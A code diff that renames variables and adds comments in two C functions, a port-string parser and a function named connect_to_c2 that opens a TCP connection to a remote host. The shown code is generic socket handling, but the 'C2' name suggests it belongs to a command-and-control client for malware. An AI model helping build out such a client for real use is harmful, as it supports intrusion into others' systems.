@@ -9,22 +9,23 @@
 #include <errno.h>          // errno, EINVAL
 #include "net.h"
 
-
-int parse_port(const char *s, uint16_t *out_port) {
-    if (!s || !*s || !out_port) {
+// This function converts a string representation of a port number into a 16-bit unsigned integer.
+int parse_port(const char *port_string, uint16_t *output_port) {
+    if (!port_string || !*port_string || !output_port) {
         errno = EINVAL;
         return -1;
     }
     char *end = NULL;
-    unsigned long v = strtoul(s, &end, 10);
-    if (*end != '\0' || v == 0 || v > 65535UL) {
+    unsigned long port_value = strtoul(port_string, &end, 10);
+    if (*end != '\0' || port_value == 0 || port_value > 65535UL) {
         errno = EINVAL;
         return -1;
     }
-    *out_port = (uint16_t)v;
+    *output_port = (uint16_t)port_value;
     return 0;
 }
 
+// This function creates a TCP socket and connects to a remote server.
 int connect_to_c2(const char *host, uint16_t port){
     if (!host || !*host || port == 0) {
         errno = EINVAL;
@@ -52,8 +53,7 @@ int connect_to_c2(const char *host, uint16_t port){
     }
 
     // connect to the server
-    int connection_status;
-    connection_status = connect(network_socket, (struct sockaddr *)&server_addr_struct, sizeof(server_addr_struct));
+    int connection_status = connect(network_socket, (struct sockaddr *)&server_addr_struct, sizeof(server_addr_struct));
     if (connection_status == -1) {
         fprintf(stderr, "Error connecting to the server\n");
         close(network_socket);
